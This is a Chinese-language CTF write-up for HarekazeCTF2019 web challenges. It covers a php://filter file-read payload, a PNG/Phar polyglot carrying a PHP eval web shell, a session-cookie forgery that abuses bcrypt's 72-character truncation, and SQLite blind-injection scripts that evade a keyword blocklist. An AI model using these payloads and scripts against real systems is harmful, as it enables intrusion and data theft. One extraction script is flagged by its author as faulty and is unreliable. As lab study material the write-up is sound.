# HarekazeCTF2019

## encode_and_decode

利用点： json unicode 字符bypass

payload

```json
{
	"page":"ph\u0070://filter/convert.base64-encode/resource=/\u0066lag"
}
```

## avatar Uploader 1

主要其实是看这里

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$type = finfo_file($finfo, $_FILES['file']['tmp_name']);
finfo_close($finfo);
if (!in_array($type, ['image/png'])) {
  error('Uploaded file is not PNG format.');
}

// check file width/height
$size = getimagesize($_FILES['file']['tmp_name']);
if ($size[0] > 256 || $size[1] > 256) {
  error('Uploaded image is too large.');
}
if ($size[2] !== IMAGETYPE_PNG) {
  // I hope this never happens...
  error('What happened...? OK, the flag for part 1 is: <code>' . getenv('FLAG1') . '</code>');
}
```

利用点 getimagesieze与finfo_file判断图片类型有差异

构造文件

```
89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 
```

就可以拿到flag1

## avatar Uploader 2

这里就是要用前面那题的性质来getshell了

因为后缀名被限制死了，考虑能不能使用``phar://``协议来攻击

代码中全局搜索一下

```php
/* common.css */
<?php include('common.css'); ?>
/* light/dark.css */
<?php include($session->get('theme', 'light') . '.css'); ?> 
/**/
```

可以看到这里存在include,然后是名字是可控的，

后缀的话，可以这样写phar来调用

```php
<?php
//89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52
$png_header = hex2bin('89504e470d0a1a0a0000000d49484452000000400000004000');
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->addFromString('exp.css', '<?php eval($_REQUEST["eki"]); ?>');
$phar->setStub($png_header . '<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

可以看到cookie是由数据段+签名段两部分构成的

```
eyJuYW1lIjoiYWRtaW4iLCJ0aGVtZSI6ImRhcmsiLCJhdmF0YXIiOiI2YWQyZDhkOS5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiaW5mbyIsIm1lc3NhZ2UiOiJZb3VyIGF2YXRhciBoYXMgYmVlbiBzdWNjZXNzZnVsbHkgdXBkYXRlZCEifX0.JDJ5JDEwJFltYTh6SW5SakNmL2laWHcvWmtPamUwb2pCL2EzQzdFeDQ4a3BMSDd6SHVZVGNJemNQOWUy
```

数据段包含

```json 
{
  "name": "admin",
  "theme": "dark",
  "avatar": "6ad2d8d9.png",
  "flash": {
    "type": "info",
    "message": "Your avatar has been successfully updated!"
  }
}
```

调用的话就可以这样调用了

```
{
  "name": "admin",
  "theme": "phar://xxxxxx.png/exp",
  "avatar": "xxxxxx.png",
  "flash": {
    "type": "info",
    "message": "Your avatar has been successfully updated!"
  }
}
```

签名验证涉及到这个类

```php
<?php
class SecureClientSession {
  private $cookieName;
  private $secret;
  private $data;

  public function __construct($cookieName = 'session', $secret = 'secret') {
    $this->data = [];
    $this->secret = $secret;

    if (array_key_exists($cookieName, $_COOKIE)) {
      try {
        list($data, $signature) = explode('.', $_COOKIE[$cookieName]);
        $data = urlsafe_base64_decode($data);
        $signature = urlsafe_base64_decode($signature);
    
        if ($this->verify($data, $signature)) {
          $this->data = json_decode($data, true);
        }
      } catch (Exception $e) {}
    }
  
    $this->cookieName = $cookieName;
  }

  public function isset($key) {
    return array_key_exists($key, $this->data);
  }

  public function get($key, $defaultValue = null){
    if (!$this->isset($key)) {
      return $defaultValue;
    }

    return $this->data[$key];
  }

  public function set($key, $value){
    $this->data[$key] = $value;
  }

  public function unset($key) {
    unset($this->data[$key]);
  }

  public function save() {
    $json = json_encode($this->data);
    $value = urlsafe_base64_encode($json) . '.' . urlsafe_base64_encode($this->sign($json));
    setcookie($this->cookieName, $value);
  }

  private function verify($string, $signature) {
    return password_verify($this->secret . $string, $signature);
  }

  private function sign($string) {
    return password_hash($this->secret . $string, PASSWORD_BCRYPT);
  }
}
```

利用点在sign处

根据php文档可知

>Caution
>
>使用PASSWORD_BCRYPT 做算法，将使 password 参数最长为72个字符，超过会被截断。

https://www.php.net/manual/zh/function.password-hash.php


就是说如果

```json
{
  "name": "admin",
  "avatar": "6ad2d8d9.png",
  "flash": {
    "type": "info",
    "message": "Your avatar has been successfully updated!"
  },//到这里的长度如果大于72 那么生成的password都是一样的 那么theme就可控了
  "theme": "dark",
}
```

上传前一题中图片，报错后可达要求

```
eyJuYW1lIjoiYWRtaW4iLCJhdmF0YXIiOiI5YTFjODI5ZS5wbmciLCJmbGFzaCI6eyJ0eXBlIjoiZXJyb3IiLCJtZXNzYWdlIjoiV2hhdCBoYXBwZW5lZC4uLj8gT0ssIHRoZSBmbGFnIGZvciBwYXJ0IDEgaXM6IDxjb2RlPjxcL2NvZGU-In19.JDJ5JDEwJHlkOVA3R3FKNTNxbW85WnZhZnRLTnU5Q01BMDJnY0d2NEJMdHlIUVJ4eVA3eUZHSXB1dEZt
```

然后把theme塞进去就可以实现getshell了


```php
<?php
$a  = '{"name":"admin","avatar":"9a1c829e.png","flash":{"type":"error","message":"What happened...? OK, the flag for part 1 is: <code><\/code>"},"theme":"phar://uploads/41bb72a3.png/exp"}';
$sign ="JDJ5JDEwJE95Q3VlbmVHaTVKRzJmOTY2UzIyLy5FZWZKalhJUVN5amNuOHBmTXEzSHVyZEJJeVlXS01H";

function urlsafe_base64_encode($data) {
    return rtrim(str_replace(['+', '/'], ['-', '_'], base64_encode($data)), '=');
}
function urlsafe_base64_decode($data) {
    return base64_decode(str_replace(['-', '_'], ['+', '/'], $data) . str_repeat('=', 3 - (3 + strlen($data)) % 4));
}

print urlsafe_base64_encode($a).".".$sign."\n";
```

### Sqlite Voting

sqlite注入,数字型

ban了一堆

```php
function is_valid($str) {
  $banword = [
    // dangerous chars
    // " % ' * + / < = > \ _ ` ~ -
    "[\"%'*+\\/<=>\\\\_`~-]",
    // whitespace chars
    '\s',
    // dangerous functions
    'blob', 'load_extension', 'char', 'unicode',
    '(in|sub)str', '[lr]trim', 'like', 'glob', 'match', 'regexp',
    'in', 'limit', 'order', 'union', 'join'
  ];
  $regexp = '/' . implode('|', $banword) . '/i';
  if (preg_match($regexp, $str)) {
    return false;
  }
  return true;
}
```

可以爆破位数

```python
import requests

url = "http://2b4dbedd-53e7-45d6-8175-c8de5f2a4676.node3.buuoj.cn/vote.php"
l = 0
for i in range(1,100):
    #payload = f'abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)'
    payload = f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),{i}),0x8000000000000000))'
    # Result 42
    payload = f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),{i}),0x8000000000000000))'
    data = {
        'id' : payload
    }
    r = requests.post(url=url, data=data)
    print(r.text)
    if 'occurred' in r.text:
        print(i)
        break
```

同样的我们可以用max来搞

一种想法是这样的

``abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))``

先利用双哈希把flag转换成纯数字，再构造逐位拆解flag

但是这个脚本似乎有点问题。。。。
```python
import requests
import sys 
url = "http://2b4dbedd-53e7-45d6-8175-c8de5f2a4676.node3.buuoj.cn/vote.php"
#l = 0
#for i in range(1,100):
    #payload = f'abs(case(length(hex((select(flag)from(flag))))&{1<<n})when(0)then(0)else(0x8000000000000000)end)'
    #payload = f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),{i}),0x8000000000000000))'
    # Result 42
    
    #data = {
    #    'id' : payload
    #}
    #r = requests.post(url=url, data=data)
    #print(r.text)
    #if 'occurred' in r.text:
    #    print(i)
    #    break

#pt = '{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-+[]?<>@!#$%^&*~'
ret =""
def str2hex(str):
    ret =""
    for i in range(0, len(str)):
        ret+=hex(ord(str[i]))
    ret = "0x"+ret.replace("0x","")
    return ret

for i in range(42):
    for c in range(32,127):
        print chr(c)
        tmp = str(int(str(int(str2hex((ret+chr(c)).ljust(42,chr(0))),16)),16))
        #print hex(int(tmp))
        tmp = [ tmp[i:i+12] for i in range(0, len(tmp), 12)]
        tmp = '||'.join(tmp)
        #print tmp
        payload = "abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),{0}),{1}),0x8000000000000000))".format(tmp,tmp)
        
        data ={
            "id":payload
        }
        #print payload
        req = requests.post(url=url, data=data)

        if req.status_code!=200 :
            continue 
        if 'occurred' in req.text:
            ret=ret+chr(c-1)
            sys.stdout.write("[-]Result : -> {0} <-\r".format(ret))
            sys.stdout.flush()
            break

print("[+]Result : ->"+ret+"<-")
```

另一种想法是利用数据库中的字符串构造出``abcdef``然后就可以16进制比较了

贴一下官方脚本

```python
# coding: utf-8
import binascii
import requests
URL = 'http://2b4dbedd-53e7-45d6-8175-c8de5f2a4676.node3.buuoj.cn/vote.php'

# フラグの長さを特定
l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data={
    'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<j})when(0)then(0)else(0x8000000000000000)end)'
  })
  if b'An error occurred' in r.content:
    l |= 1 << j
print('[+] length:', l)

# A-F のテーブルを作成
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'

# フラグをゲット!
res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    print(t)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

